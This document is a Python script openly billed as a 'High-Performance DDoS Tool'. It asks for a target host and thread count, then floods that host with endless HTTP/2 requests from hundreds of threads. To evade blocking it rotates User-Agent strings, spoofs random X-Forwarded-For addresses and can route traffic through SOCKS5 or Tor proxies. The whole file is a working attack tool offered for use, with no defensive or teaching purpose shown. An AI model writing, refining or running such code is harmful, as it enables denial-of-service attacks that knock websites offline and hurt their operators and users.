import random
import time
import ssl
import httpx
import socks
import socket
from concurrent.futures import ThreadPoolExecutor

# ASCII Banner
def banner():
    print(r"""
 ███████╗████████╗ ██████╗ ███╗   ███╗███████╗███████╗
 ██╔════╝╚══██╔══╝██╔═══██╗████╗ ████║██╔════╝██╔════╝
 ███████╗   ██║   ██║   ██║██╔████╔██║███████╗███████╗
 ╚════██║   ██║   ██║   ██║██║╚██╔╝██║╚════██║╚════██║
 ███████║   ██║   ╚██████╔╝██║ ╚═╝ ██║███████║███████║
 ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
              ⚡ High-Performance DDoS Tool ⚡
    """)

# User Input
def get_user_input():
    target = input("🌐 Enter Target (e.g., example.com): ").strip()
    port = int(input("🔢 Enter Port (80 for HTTP, 443 for HTTPS): ").strip())
    threads = int(input("⚡ Enter Number of Threads (100-1000 recommended): ").strip())
    use_proxies = input("🛡️ Use Proxies? (yes/no): ").strip().lower() == "yes"

    return target, port, threads, use_proxies

# User-Agent List
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
]

# Proxy List (Modify or Load from File)
PROXIES = [
    "127.0.0.1:9050",  # Example SOCKS5 Proxy (Use Tor or Paid Proxies)
]

# Function to Get Random Proxy
def get_proxy():
    proxy = random.choice(PROXIES)
    ip, port = proxy.split(":")
    return ip, int(port)

# Attack Function
def attack(target, port, use_proxies):
    while True:
        try:
            # Random Headers
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": f"https://{target}/",
                "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            }

            # Enable Proxy if Needed
            if use_proxies:
                proxy_ip, proxy_port = get_proxy()
                socks.set_default_proxy(socks.SOCKS5, proxy_ip, proxy_port)
                socket.socket = socks.socksocket

            # HTTP/2 Request
            with httpx.Client(http2=True, verify=False, timeout=5) as client:
                response = client.get(f"https://{target}", headers=headers)
                print(f"[*] Sent Request to {target}:{port} | Status: {response.status_code}")

            time.sleep(random.uniform(0.1, 0.5))  # Randomized Delay

        except Exception as e:
            print(f"[!] Error: {e}")

# Main Function
def main():
    banner()
    target, port, threads, use_proxies = get_user_input()

    print(f"\n🚀 **Launching Attack on {target}:{port} with {threads} threads!** 🚀\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(attack, target, port, use_proxies)

if __name__ == "__main__":
    main()